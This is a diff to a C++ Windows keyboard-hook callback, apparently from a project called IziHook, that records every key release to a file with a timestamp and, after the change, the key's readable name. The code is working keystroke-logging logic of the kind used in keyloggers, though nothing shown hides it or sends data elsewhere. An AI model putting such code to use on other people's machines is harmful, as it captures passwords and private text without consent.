@@ -13,7 +13,8 @@
 #include <ctime>
 #include <iostream>
 #include <fstream>
-
+#include <sstream>
+#include <atlstr.h>
 
 #include "IziHook.hh"
 
@@ -59,19 +60,20 @@ LRESULT CALLBACK kbproc(
 
 		if (wparam == WM_KEYDOWN)
 		{
-			std::time_t t = std::time(nullptr);
-			file_out << (int) t << ":"
-					 << keyInfo.vkCode << ":"
-					 << "1" << std::endl;
+
 		}
 		if (wparam == WM_KEYUP)
 		{
 			std::time_t t = std::time(nullptr);
-
-			file_out << (int) t << ":"
-					 << keyInfo.vkCode << ":"
-					 << "2" << std::endl;
-			std::cout << keyInfo.vkCode << "_UP ";
+			std::stringstream ss;
+			std::string buffer2;
+			char buffer[32] = {};
+			UINT key = 0;
+			key = (keyInfo.scanCode << 16);
+			GetKeyNameText(key, (LPSTR)buffer, sizeof(buffer));
+			file_out << (int)t << ":"
+				<< buffer << ":"
+				<< "2" << std::endl;
 		}
 		if (!ReleaseMutex(mutex))
 		{
